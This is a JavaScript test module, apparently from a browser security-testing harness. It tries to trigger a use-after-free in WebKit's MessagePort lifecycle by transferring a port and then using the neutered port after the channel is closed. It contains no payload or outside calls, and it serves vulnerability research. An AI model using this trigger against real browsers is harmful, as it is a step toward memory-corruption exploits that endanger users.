/**
 * SC_MESSAGEPORT_UAF.JS
 * Categoria : WORKERS — Use-After-Free / Type Confusion
 * Alvo      : WebCore::MessagePort C++ lifecycle
 * Técnica   : Cria um MessageChannel, transfere port2 via postMessage
 *             e mantém referência JS ao port transferido. Fecha port1
 *             e verifica se operações sobre port2 acessam memória livre.
 *             Também testa entangle/disentangle de ports.
 * Referência: WebKit MessagePort disentangle UAF pattern
 */

export default {
    id:          'MESSAGEPORT_UAF',
    category:    'WORKERS',
    risk:        'HIGH',
    description: 'MessagePort JS retém referência após transferência. '
                + 'Testa acesso ao port C++ entangled após close/transfer.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _channel:      null,
    _port1:        null,
    _port2:        null,
    _recvCount:    0,
    _recvData:     null,
    _transferPort: null,

    supported: function() {
        return typeof MessageChannel !== 'undefined';
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._recvCount    = 0;
        this._recvData     = null;
        this._transferPort = null;

        this._channel = new MessageChannel();
        this._port1   = this._channel.port1;
        this._port2   = this._channel.port2;

        this._port1.onmessage = (e) => {
            this._recvCount++;
            this._recvData = typeof e.data === 'object' ? JSON.stringify(e.data) : String(e.data);
        };

        this._port1.start();
        this._port2.start();

        // Troca inicial para confirmar funcionamento
        this._port2.postMessage({ phase: 'init', canary: 0x41414141 });
        await new Promise(r => setTimeout(r, 20));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        // Cria um segundo canal e transfere port2 para dentro de uma mensagem
        const helperChannel = new MessageChannel();

        // Guarda referência ao port antes de transferir
        this._transferPort = this._port2;

        try {
            // Transferência — após isso, port2 fica "neutered" no JS
            this._port1.postMessage({ payload: 'transfer' }, [this._port2]);
        } catch(_) {}

        // Fecha port1 — libera o entanglement C++
        try {
            this._port1.close();
        } catch(_) {}

        helperChannel.port1.close();
        helperChannel.port2.close();

        // Tenta usar o port transferido (neutered)
        try {
            this._transferPort.postMessage({ phase: 'post-transfer' });
        } catch(_) {}

        await new Promise(r => setTimeout(r, 20));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-3] port1 após close
        s => typeof s._port1,
        s => s._port1 === null,
        s => s._port1 instanceof MessagePort,
        s => s._recvCount,

        // [4-6] port2 após transferência (deve ser neutered)
        s => typeof s._port2,
        s => s._port2 instanceof MessagePort,
        s => s._recvData ?? 'null',

        // [7-9] port transferido — tentativa de uso pós-transfer
        s => typeof s._transferPort,
        s => s._transferPort instanceof MessagePort,
        s => { try { s._transferPort?.postMessage('probe'); return 'ok'; } catch(e) { return e.constructor.name; } },
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        try { this._port1?.close(); } catch(_) {}
        try { this._port2?.close(); } catch(_) {}
        this._channel      = null;
        this._port1        = null;
        this._port2        = null;
        this._transferPort = null;
        this._recvCount    = 0;
        this._recvData     = null;
    }
};
